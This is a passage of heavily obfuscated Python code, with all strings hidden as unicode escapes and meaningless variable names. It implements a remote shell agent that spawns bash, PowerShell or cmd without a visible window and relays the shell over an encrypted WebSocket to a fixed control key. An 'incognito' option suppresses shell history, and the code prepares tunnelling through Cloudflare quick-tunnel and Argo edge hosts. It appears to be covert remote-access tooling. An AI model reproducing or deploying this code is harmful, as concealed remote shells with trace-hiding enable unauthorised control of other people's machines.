        codecs.decode('\\u65e7\\u7248\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ba1\\u9053\\u56de\\u9000\\u5b9e\\u73b0\\u0020\\u0028\\u65e0\\u0020\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0029\\u003a\\u0020\\u65e0\\u771f\\u5b9e\\u7ec8\\u7aef\\u002c\\u0020\\u0072\\u0065\\u0073\\u0069\\u007a\\u0065\\u0020\\u4e3a\\u0020\\u006e\\u006f\\u002d\\u006f\\u0070', 'unicode_escape')

        def __init__(self, shell: str, env: Dict[str, str], O0_var_402: int, O0_var_403: int, cwd: str=None, args: list=None):
            self.shell = shell
            self.env = env
            self.cwd = cwd
            self.args = list(args or [])
            self._in_w = self._out_r = None
            self._proc = None
            self.pid = 0

        def start(self):
            O0_var_404, O0_var_405 = os.pipe()
            O0_var_406, O0_var_407 = os.pipe()
            self._proc = subprocess.Popen([self.shell] + self.args, stdin=O0_var_404, stdout=O0_var_407, stderr=O0_var_407, env=self.env, cwd=self.cwd, creationflags=_CREATE_NO_WINDOW_FLAG)
            os.close(O0_var_404)
            os.close(O0_var_407)
            self._in_w = O0_var_405
            self._out_r = O0_var_406
            os.set_blocking(self._out_r, False)
            self.pid = self._proc.pid

        def set_size(self, O0_var_408: int, O0_var_409: int):
            return None

        def read(self, O0_var_410: int) -> bytes:
            if self._out_r is None:
                return b''
            try:
                return os.read(self._out_r, O0_var_410)
            except BlockingIOError:
                return None

        def write(self, data: bytes) -> int:
            if self._in_w is None:
                return 0
            return os.write(self._in_w, data)

        def close(self):
            for O0_var_411 in (self._in_w, self._out_r):
                if O0_var_411 is not None:
                    try:
                        os.close(O0_var_411)
                    except Exception:
                        pass
            self._in_w = self._out_r = None
            if self._proc is not None:
                try:
                    if self._proc.poll() is None:
                        self._proc.terminate()
                except Exception:
                    pass
                self._proc = None

        def kill_tree(self):
            _taskkill(self.pid)

    def _create_windows_backend(shell: str, env: Dict[str, str], O0_var_412: int, O0_var_413: int, cwd: str=None, args: list=None):
        if _KERNEL32 is not None:
            return _ConPtyTerminal(shell, env, O0_var_412, O0_var_413, cwd, args)
        return _PipeTerminal(shell, env, O0_var_412, O0_var_413, cwd, args)

    def _windows_default_shell() -> str:
        O0_var_414 = shutil.which(codecs.decode('\\u0070\\u006f\\u0077\\u0065\\u0072\\u0073\\u0068\\u0065\\u006c\\u006c\\u002e\\u0065\\u0078\\u0065', 'unicode_escape'))
        if O0_var_414:
            return O0_var_414
        O0_var_415 = os.environ.get(codecs.decode('\\u0043\\u004f\\u004d\\u0053\\u0050\\u0045\\u0043', 'unicode_escape'))
        if O0_var_415 and os.path.exists(O0_var_415):
            return O0_var_415
        return codecs.decode('\\u0063\\u006d\\u0064\\u002e\\u0065\\u0078\\u0065', 'unicode_escape')
else:

    def _windows_default_shell() -> str:
        return codecs.decode('', 'unicode_escape')

    def _create_windows_backend(*args, **kwargs):
        raise RuntimeError(codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ec8\\u7aef\\u540e\\u7aef\\u4ec5\\u652f\\u6301\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u5e73\\u53f0', 'unicode_escape'))

class TerminalSessionHandler:

    def __init__(self):
        self.process = None
        self.master_fd = None
        self.slave_fd = None
        self.terminal = None
        self.meta_requested = False
        self.incognito_requested = False
        self.websocket: WebSocket = None
        self.request_id: str = None
        self.AGENT_PRIVATE_KEY = Config.keys[codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')].private_b64
        self.CONTROL_PUBLIC_KEY = Config.keys[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')].public_b64
        self.cipher = NoiseSessionWrapper(is_initiator=False, local_priv_b64=self.AGENT_PRIVATE_KEY, expected_remote_pub_b64=self.CONTROL_PUBLIC_KEY)

    def _read_key_file(self, O0_var_416: str) -> str:
        try:
            if os.path.exists(O0_var_416):
                with open(O0_var_416, codecs.decode('\\u0072', 'unicode_escape')) as O0_var_417:
                    return O0_var_417.read().strip()
            return None
        except Exception as e:
            Logger.error(codecs.decode('\\u8bfb\\u53d6\\u5bc6\\u94a5\\u6587\\u4ef6\\u0020', 'unicode_escape') + str(O0_var_416) + codecs.decode('\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
            return None

    async def cleanup(self):
        if self.request_id:
            Logger.info(codecs.decode('\\u005b', 'unicode_escape') + str(self.request_id) + codecs.decode('\\u005d\\u0020\\u6267\\u884c\\u7ec8\\u7aef\\u8d44\\u6e90\\u6e05\\u7406\\u002e\\u002e\\u002e', 'unicode_escape'))
        O0_var_418 = getattr(self, codecs.decode('\\u0074\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c', 'unicode_escape'), None)
        if O0_var_418 is not None:
            O0_var_418.kill_tree()
            O0_var_418.close()
            self.terminal = None
        if self.process:
            try:
                if hasattr(os, codecs.decode('\\u006b\\u0069\\u006c\\u006c\\u0070\\u0067', 'unicode_escape')):
                    os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                else:
                    self.process.terminate()
                try:
                    await asyncio.wait_for(self.process.wait(), timeout=2.0)
                except asyncio.TimeoutError:
                    self.process.kill()
            except Exception:
                pass
            self.process = None
        for O0_var_419 in [codecs.decode('\\u006d\\u0061\\u0073\\u0074\\u0065\\u0072\\u005f\\u0066\\u0064', 'unicode_escape'), codecs.decode('\\u0073\\u006c\\u0061\\u0076\\u0065\\u005f\\u0066\\u0064', 'unicode_escape')]:
            O0_var_420 = getattr(self, O0_var_419)
            if O0_var_420 is not None:
                try:
                    os.close(O0_var_420)
                except Exception:
                    pass
                setattr(self, O0_var_419, None)
        if self.websocket:
            try:
                await self.websocket.close(code=1000)
            except Exception:
                pass
            finally:
                self.websocket = None

    async def _do_noise_handshake(self, O0_var_421: WebSocket, O0_var_422):
        O0_var_422(codecs.decode('\\U0001f91d\\u0020\\u5f00\\u59cb\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u52a0\\u5bc6\\u63e1\\u624b\\u002e\\u002e\\u002e', 'unicode_escape'))
        try:
            O0_var_423 = await O0_var_421.receive_bytes()
            O0_var_424 = self.cipher.process_handshake(O0_var_423)
            await O0_var_421.send_bytes(O0_var_424)
            O0_var_425 = await O0_var_421.receive_bytes()
            self.cipher.process_handshake(O0_var_425)
            O0_var_426 = self.cipher.expected_remote_pub
            O0_var_427 = self.cipher.captured_remote_pub
            if not O0_var_426 or not O0_var_427 or (not hmac.compare_digest(O0_var_427, O0_var_426)):
                O0_var_422(codecs.decode('\\U0001f6a8\\u0020\\u7ec8\\u7aef\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u63e1\\u624b\\u5bf9\\u7aef\\u8eab\\u4efd\\u6821\\u9a8c\\u5931\\u8d25\\u002c\\u0020\\u62d2\\u7edd\\u4f1a\\u8bdd', 'unicode_escape'))
                try:
                    await O0_var_421.close(code=1008, reason=codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0070\\u0065\\u0065\\u0072\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'))
                except Exception:
                    pass
                raise PermissionError(codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0070\\u0065\\u0065\\u0072\\u0020\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'))
            O0_var_422(codecs.decode('\\u2705\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u63e1\\u624b\\u5b8c\\u6210\\uff0c\\u7aef\\u5230\\u7aef\\u52a0\\u5bc6\\u901a\\u9053\\u5df2\\u5efa\\u7acb\\uff01', 'unicode_escape'))
        except PermissionError as e:
            O0_var_422(codecs.decode('\\U0001f6a8\\u0020\\u62d2\\u7edd\\u8bbf\\u95ee\\u003a\\u0020', 'unicode_escape') + str(e))
            raise
        except Exception as e:
            O0_var_422(codecs.decode('\\U0001f4a5\\u0020\\u63e1\\u624b\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
            raise RuntimeError(codecs.decode('\\u52a0\\u5bc6\\u63e1\\u624b\\u5931\\u8d25', 'unicode_escape'))

    async def start_session(self, O0_var_428: WebSocket, O0_var_429: str, O0_var_430: bool=True, meta_requested: bool=False, incognito_requested: bool=False):
        self.websocket = O0_var_428
        self.request_id = O0_var_429
        self.use_noise = O0_var_430
        self.meta_requested = meta_requested
        self.incognito_requested = incognito_requested
        O0_var_431 = lambda msg: Logger.info(codecs.decode('\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(O0_var_429) + codecs.decode('\\u005d\\u0020', 'unicode_escape') + str(msg))
        O0_var_431(codecs.decode('\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u5df2\\u5efa\\u7acb\\uff0c\\u7b49\\u5f85\\u63a5\\u53d7\\u8fde\\u63a5\\u002e\\u002e\\u002e', 'unicode_escape'))
        try:
            await O0_var_428.accept()
            O0_var_431(codecs.decode('\\u2705\\u0020\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u0020\\u8fde\\u63a5\\u5df2\\u63a5\\u53d7', 'unicode_escape'))
            if self.use_noise:
                await self._do_noise_handshake(O0_var_428, O0_var_431)
            else:
                O0_var_431(codecs.decode('\\u26a1\\u0020\\u8d70\\u0020\\u0048\\u0054\\u0054\\u0050\\u0053\\u0020\\u660e\\u6587\\u964d\\u7ea7\\u901a\\u9053\\uff0c\\u8df3\\u8fc7\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u63e1\\u624b\\u3002', 'unicode_escape'))
            await self._run_terminal(O0_var_428, O0_var_429, O0_var_431)
        except WebSocketDisconnect:
            O0_var_431(codecs.decode('\\U0001f50c\\u0020\\u5ba2\\u6237\\u7aef\\u4e3b\\u52a8\\u65ad\\u5f00\\u8fde\\u63a5', 'unicode_escape'))
        except Exception as e:
            O0_var_431(codecs.decode('\\u274c\\u0020\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u5f02\\u5e38\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(e))
        finally:
            await self.cleanup()
            O0_var_431(codecs.decode('\\u2705\\u0020\\u8d44\\u6e90\\u6e05\\u7406\\u5b8c\\u6bd5\\u003a\\u0020', 'unicode_escape') + str(O0_var_429))

    @staticmethod
    def get_available_shell():
        if _IS_WINDOWS:
            return _windows_default_shell()
        for O0_var_432 in [codecs.decode('\\u0062\\u0061\\u0073\\u0068', 'unicode_escape'), codecs.decode('\\u007a\\u0073\\u0068', 'unicode_escape'), codecs.decode('\\u0061\\u0073\\u0068', 'unicode_escape')]:
            O0_var_433 = shutil.which(O0_var_432)
            if O0_var_433:
                return O0_var_433
        O0_var_434 = os.environ.get(codecs.decode('\\u0053\\u0048\\u0045\\u004c\\u004c', 'unicode_escape'))
        if O0_var_434 and os.path.exists(O0_var_434) and os.access(O0_var_434, os.X_OK):
            return O0_var_434
        return shutil.which(codecs.decode('\\u0073\\u0068', 'unicode_escape')) or codecs.decode('\\u002f\\u0062\\u0069\\u006e\\u002f\\u0073\\u0068', 'unicode_escape')

    @staticmethod
    def _normalize_shell_name(shell_path: str) -> str:
        O0_var_435 = os.path.basename(shell_path or codecs.decode('', 'unicode_escape')).strip()
        if O0_var_435.lower().endswith(codecs.decode('\\u002e\\u0065\\u0078\\u0065', 'unicode_escape')):
            O0_var_435 = O0_var_435[:-4]
        return (O0_var_435 or codecs.decode('\\u0073\\u0068', 'unicode_escape')).lower()

    @staticmethod
    def _incognito_native_applied(shell_path: str) -> bool:
        if _IS_WINDOWS:
            return os.path.basename(shell_path or codecs.decode('', 'unicode_escape')).lower() in (codecs.decode('\\u0070\\u006f\\u0077\\u0065\\u0072\\u0073\\u0068\\u0065\\u006c\\u006c\\u002e\\u0065\\u0078\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u006d\\u0064\\u002e\\u0065\\u0078\\u0065', 'unicode_escape'))
        return True

    async def _send_welcome(self, O0_var_436: WebSocket, O0_var_437: str):
        if not self.meta_requested:
            return
        O0_var_438 = json.dumps({codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0077\\u0065\\u006c\\u0063\\u006f\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0068\\u0065\\u006c\\u006c', 'unicode_escape'): self._normalize_shell_name(O0_var_437), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_437, codecs.decode('\\u0069\\u006e\\u0063\\u006f\\u0067\\u006e\\u0069\\u0074\\u006f', 'unicode_escape'): bool(self.incognito_requested and self._incognito_native_applied(O0_var_437))}).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        await self._send_ws_bytes(O0_var_436, O0_var_438)

    def set_pty_size(self, O0_var_439: int, O0_var_440: int):
        O0_var_441 = getattr(self, codecs.decode('\\u0074\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c', 'unicode_escape'), None)
        if O0_var_441 is not None:
            O0_var_441.set_size(O0_var_439, O0_var_440)
            return
        if self.master_fd is not None:
            try:
                O0_var_442 = struct.pack(codecs.decode('\\u0048\\u0048\\u0048\\u0048', 'unicode_escape'), O0_var_439, O0_var_440, 0, 0)
                fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, O0_var_442)
            except Exception as e:
                Logger.warning(codecs.decode('\\u8bbe\\u7f6e\\u0020\\u0050\\u0054\\u0059\\u0020\\u5c3a\\u5bf8\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))

    async def _run_terminal(self, O0_var_443: WebSocket, O0_var_444: str, O0_var_445):
        self.master_fd = None
        self.slave_fd = None
        try:
            O0_var_446 = os.environ.copy()
            O0_var_446.pop(codecs.decode('\\u0050\\u0052\\u004f\\u004d\\u0050\\u0054\\u005f\\u0043\\u004f\\u004d\\u004d\\u0041\\u004e\\u0044', 'unicode_escape'), None)
            O0_var_446.setdefault(codecs.decode('\\u0054\\u0045\\u0052\\u004d', 'unicode_escape'), codecs.decode('\\u0078\\u0074\\u0065\\u0072\\u006d\\u002d\\u0032\\u0035\\u0036\\u0063\\u006f\\u006c\\u006f\\u0072', 'unicode_escape'))
            if codecs.decode('\\u004c\\u0041\\u004e\\u0047', 'unicode_escape') not in O0_var_446:
                O0_var_446[codecs.decode('\\u004c\\u0041\\u004e\\u0047', 'unicode_escape')] = codecs.decode('\\u0043\\u002e\\u0055\\u0054\\u0046\\u002d\\u0038', 'unicode_escape')
            if _IS_WINDOWS:
                await self._run_terminal_windows(O0_var_443, O0_var_444, O0_var_445, O0_var_446)
                return
            if self.incognito_requested:
                O0_var_446[codecs.decode('\\u0048\\u0049\\u0053\\u0054\\u0046\\u0049\\u004c\\u0045', 'unicode_escape')] = codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f\\u006e\\u0075\\u006c\\u006c', 'unicode_escape')
            self.master_fd, self.slave_fd = pty.openpty()
            self.set_pty_size(24, 80)
            O0_var_447 = self.get_available_shell()
            O0_var_445(codecs.decode('\\U0001f41a\\u0020\\u4f7f\\u7528\\u0020\\u0053\\u0068\\u0065\\u006c\\u006c\\u0020\\u8def\\u5f84\\u003a\\u0020', 'unicode_escape') + str(O0_var_447))

            def pty_preexec():
                import termios, fcntl
                os.setsid()
                try:
                    fcntl.ioctl(0, termios.TIOCSCTTY, 0)
                except Exception:
                    pass
            self.process = await asyncio.create_subprocess_exec(O0_var_447, stdin=self.slave_fd, stdout=self.slave_fd, stderr=self.slave_fd, env=O0_var_446, preexec_fn=pty_preexec)
            O0_var_445(codecs.decode('\\U0001f680\\u0020\\u7ec8\\u7aef\\u8fdb\\u7a0b\\u5df2\\u542f\\u52a8\\u0020\\u0028\\u0050\\u0049\\u0044\\u003a\\u0020', 'unicode_escape') + str(self.process.pid) + codecs.decode('\\u0029', 'unicode_escape'))
            await self._send_welcome(O0_var_443, O0_var_447)
            if self.slave_fd is not None:
                os.close(self.slave_fd)
                self.slave_fd = None
            O0_var_448 = fcntl.fcntl(self.master_fd, fcntl.F_GETFL)
            fcntl.fcntl(self.master_fd, fcntl.F_SETFL, O0_var_448 | os.O_NONBLOCK)
            O0_var_449 = [asyncio.create_task(self._handle_pty_output(O0_var_443, self.master_fd, O0_var_445)), asyncio.create_task(self._handle_websocket_input(O0_var_443, self.master_fd, O0_var_445)), asyncio.create_task(self._monitor_process(self.process, O0_var_445))]
            O0_var_450, O0_var_451 = await asyncio.wait(O0_var_449, return_when=asyncio.FIRST_COMPLETED)
            for O0_var_452 in O0_var_451:
                O0_var_452.cancel()
            try:
                await O0_var_443.close(code=1000, reason=codecs.decode('\\u0054\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c\\u0020\\u0065\\u0078\\u0069\\u0074\\u0065\\u0064\\u0020\\u006e\\u006f\\u0072\\u006d\\u0061\\u006c\\u006c\\u0079', 'unicode_escape'))
            except Exception:
                pass
        except Exception as e:
            O0_var_445(codecs.decode('\\U0001f4a5\\u0020\\u542f\\u52a8\\u7ec8\\u7aef\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(str(e)))
            await self.cleanup()
            raise

    async def _run_terminal_windows(self, O0_var_453: WebSocket, O0_var_454: str, O0_var_455, env: dict):
        try:
            O0_var_456 = self.get_available_shell()
            O0_var_455(codecs.decode('\\U0001f41a\\u0020\\u4f7f\\u7528\\u0020\\u0053\\u0068\\u0065\\u006c\\u006c\\u0020\\u8def\\u5f84\\u003a\\u0020', 'unicode_escape') + str(O0_var_456))
            O0_var_457 = []
            if self.incognito_requested and os.path.basename(O0_var_456).lower() == codecs.decode('\\u0070\\u006f\\u0077\\u0065\\u0072\\u0073\\u0068\\u0065\\u006c\\u006c\\u002e\\u0065\\u0078\\u0065', 'unicode_escape'):
                O0_var_457 = [codecs.decode('\\u002d\\u004e\\u006f\\u0045\\u0078\\u0069\\u0074', 'unicode_escape'), codecs.decode('\\u002d\\u0043\\u006f\\u006d\\u006d\\u0061\\u006e\\u0064', 'unicode_escape'), codecs.decode('\\u0053\\u0065\\u0074\\u002d\\u0050\\u0053\\u0052\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u004f\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u002d\\u0048\\u0069\\u0073\\u0074\\u006f\\u0072\\u0079\\u0053\\u0061\\u0076\\u0065\\u0053\\u0074\\u0079\\u006c\\u0065\\u0020\\u0053\\u0061\\u0076\\u0065\\u004e\\u006f\\u0074\\u0068\\u0069\\u006e\\u0067', 'unicode_escape')]
            O0_var_458 = _resolve_safe_cwd()
            O0_var_459 = _create_windows_backend(O0_var_456, env, 24, 80, O0_var_458, O0_var_457)
            O0_var_459.start()
            self.terminal = O0_var_459
            self.process = None
            O0_var_455(codecs.decode('\\U0001f680\\u0020\\u7ec8\\u7aef\\u8fdb\\u7a0b\\u5df2\\u542f\\u52a8\\u0020\\u0028\\u0050\\u0049\\u0044\\u003a\\u0020', 'unicode_escape') + str(O0_var_459.pid) + codecs.decode('\\u0029', 'unicode_escape'))
            await self._send_welcome(O0_var_453, O0_var_456)
            O0_var_460 = [asyncio.create_task(self._handle_windows_output(O0_var_453, O0_var_459, O0_var_455)), asyncio.create_task(self._handle_websocket_input(O0_var_453, O0_var_459, O0_var_455))]
            O0_var_461, O0_var_462 = await asyncio.wait(O0_var_460, return_when=asyncio.FIRST_COMPLETED)
            for O0_var_463 in O0_var_462:
                O0_var_463.cancel()
            try:
                await O0_var_453.close(code=1000, reason=codecs.decode('\\u0054\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c\\u0020\\u0065\\u0078\\u0069\\u0074\\u0065\\u0064\\u0020\\u006e\\u006f\\u0072\\u006d\\u0061\\u006c\\u006c\\u0079', 'unicode_escape'))
            except Exception:
                pass
        except Exception as e:
            O0_var_455(codecs.decode('\\U0001f4a5\\u0020\\u542f\\u52a8\\u7ec8\\u7aef\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(str(e)))
            await self.cleanup()
            raise

    @staticmethod
    def _write_terminal(target, data: bytes):
        if isinstance(target, int):
            os.write(target, data)
        else:
            target.write(data)

    async def _send_ws_bytes(self, O0_var_464: WebSocket, data: bytes):
        O0_var_465 = getattr(self, codecs.decode('\\u005f\\u0077\\u0073\\u005f\\u0073\\u0065\\u006e\\u0064\\u005f\\u006c\\u006f\\u0063\\u006b', 'unicode_escape'), None)
        if O0_var_465 is None:
            O0_var_465 = self._ws_send_lock = asyncio.Lock()
        async with O0_var_465:
            if self.use_noise:
                data = self.cipher.encrypt(data)
            await O0_var_464.send_bytes(data)

    async def _handle_windows_output(self, O0_var_466: WebSocket, O0_var_467, O0_var_468):
        O0_var_469 = asyncio.get_running_loop()
        O0_var_470 = asyncio.Queue()
        O0_var_471 = threading.Event()

        def reader():
            while not O0_var_471.is_set():
                try:
                    O0_var_472 = O0_var_467.read(8192)
                except OSError:
                    break
                if O0_var_472 is None:
                    time.sleep(0.01)
                    continue
                if not O0_var_472:
                    break
                O0_var_469.call_soon_threadsafe(O0_var_470.put_nowait, O0_var_472)
            O0_var_469.call_soon_threadsafe(O0_var_470.put_nowait, None)
        O0_var_473 = threading.Thread(target=reader, daemon=True, name=codecs.decode('\\u0063\\u006f\\u006e\\u0070\\u0074\\u0079\\u002d\\u0072\\u0065\\u0061\\u0064\\u0065\\u0072\\u002d', 'unicode_escape') + str(self.request_id))
        O0_var_473.start()
        try:
            while True:
                O0_var_474 = await O0_var_470.get()
                if O0_var_474 is None:
                    break
                await self._send_ws_bytes(O0_var_466, O0_var_474)
        except (WebSocketDisconnect, ConnectionResetError, OSError):
            pass
        finally:
            O0_var_471.set()
            O0_var_468(codecs.decode('\\U0001f50c\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ec8\\u7aef\\u8f93\\u51fa\\u5faa\\u73af\\u7ed3\\u675f', 'unicode_escape'))

    async def _handle_pty_output(self, O0_var_475: WebSocket, O0_var_476: int, O0_var_477):
        try:
            while True:
                if O0_var_476 is None:
                    break
                O0_var_478, O0_var_479, O0_var_479 = select.select([O0_var_476], [], [], 0.1)
                if O0_var_476 in O0_var_478:
                    try:
                        O0_var_480 = os.read(O0_var_476, 8192)
                        if not O0_var_480:
                            break
                        await self._send_ws_bytes(O0_var_475, O0_var_480)
                    except BlockingIOError:
                        await asyncio.sleep(0.01)
                    except OSError as e:
                        if e.errno == 5:
                            break
                        raise
                else:
                    await asyncio.sleep(0.01)
        except (OSError, WebSocketDisconnect, ConnectionResetError):
            pass

    async def _handle_websocket_input(self, O0_var_481: WebSocket, O0_var_482: int, O0_var_483):
        try:
            async for O0_var_484 in O0_var_481.iter_bytes():
                if O0_var_482 is None:
                    break
                if self.use_noise:
                    try:
                        O0_var_485 = self.cipher.decrypt(O0_var_484)
                    except Exception as e:
                        O0_var_483(codecs.decode('\\u26a0\\ufe0f\\u0020\\u89e3\\u5bc6\\u5931\\u8d25\\uff0c\\u6536\\u5230\\u975e\\u6cd5\\u5305\\u003a\\u0020', 'unicode_escape') + str(e))
                        break
                else:
                    O0_var_485 = O0_var_484
                try:
                    O0_var_486 = O0_var_485.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                    if O0_var_486.strip().startswith(codecs.decode('\\u007b', 'unicode_escape')):
                        O0_var_487 = json.loads(O0_var_486)
                        O0_var_488 = O0_var_487.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'))
                        if O0_var_488 == codecs.decode('\\u0068\\u0065\\u0061\\u0072\\u0074\\u0062\\u0065\\u0061\\u0074', 'unicode_escape'):
                            O0_var_489 = json.dumps({codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0065\\u0061\\u0072\\u0074\\u0062\\u0065\\u0061\\u0074', 'unicode_escape')}).encode()
                            await self._send_ws_bytes(O0_var_481, O0_var_489)
                            continue
                        if O0_var_488 == codecs.decode('\\u0072\\u0065\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'):
                            O0_var_490, O0_var_491 = (O0_var_487.get(codecs.decode('\\u0072\\u006f\\u0077\\u0073', 'unicode_escape'), 24), O0_var_487.get(codecs.decode('\\u0063\\u006f\\u006c\\u0073', 'unicode_escape'), 80))
                            self.set_pty_size(O0_var_490, O0_var_491)
                            continue
                        if O0_var_488 == codecs.decode('\\u0069\\u006e\\u0070\\u0075\\u0074', 'unicode_escape') and codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape') in O0_var_487:
                            O0_var_492 = O0_var_487[codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')]
                            if O0_var_487.get(codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape')) == codecs.decode('\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape'):
                                O0_var_493 = base64.b64decode(O0_var_492)
                            else:
                                O0_var_493 = O0_var_492.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                            self._write_terminal(O0_var_482, O0_var_493)
                            continue
                except (UnicodeDecodeError, json.JSONDecodeError):
                    pass
                self._write_terminal(O0_var_482, O0_var_485)
        except WebSocketDisconnect:
            O0_var_483(codecs.decode('\\U0001f50c\\u0020\\u5ba2\\u6237\\u7aef\\u65ad\\u5f00\\uff0c\\u505c\\u6b62\\u63a5\\u6536\\u8f93\\u5165', 'unicode_escape'))
        except OSError:
            pass

    async def _monitor_process(self, O0_var_494, O0_var_495):
        try:
            await O0_var_494.wait()
        except Exception:
            pass
QUICK_SERVICE = codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')

def _edge_hosts():
    O0_var_496 = [O0_var_497.strip() for O0_var_497 in os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0045\\u0044\\u0047\\u0045\\u005f\\u0048\\u004f\\u0053\\u0054\\u0053', 'unicode_escape'), codecs.decode('', 'unicode_escape')).split(codecs.decode('\\u002c', 'unicode_escape')) if O0_var_497.strip()]
    return tuple(O0_var_496) if O0_var_496 else (codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u006f\\u006e\\u0031\\u002e\\u0076\\u0032\\u002e\\u0061\\u0072\\u0067\\u006f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u006f\\u006e\\u0032\\u002e\\u0076\\u0032\\u002e\\u0061\\u0072\\u0067\\u006f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'))
EDGE_HOSTS = _edge_hosts()
EDGE_PORT = 7844
CONTROL_HEADER = codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u002d\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape')
CONTROL_STREAM = codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u002d\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')
UPDATE_CONFIGURATION = codecs.decode('\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u002d\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0075\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape')
MAX_FRAME_SIZE = 16384

def _argo_env_int(name, O0_var_498, O0_var_499):
    try:
        O0_var_500 = int(os.getenv(name, codecs.decode('', 'unicode_escape')).strip())
    except ValueError:
        return O0_var_498
    if O0_var_500 < O0_var_499:
        return O0_var_498
    return O0_var_500
ARGO_REREGISTER_AFTER = _argo_env_int(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0041\\u0052\\u0047\\u004f\\u005f\\u0052\\u0045\\u0052\\u0045\\u0047\\u0049\\u0053\\u0054\\u0045\\u0052\\u005f\\u0041\\u0046\\u0054\\u0045\\u0052', 'unicode_escape'), 5, 2)
ARGO_REREGISTER_RETRY_SECONDS = 30.0

def _argo_idle_timeout():
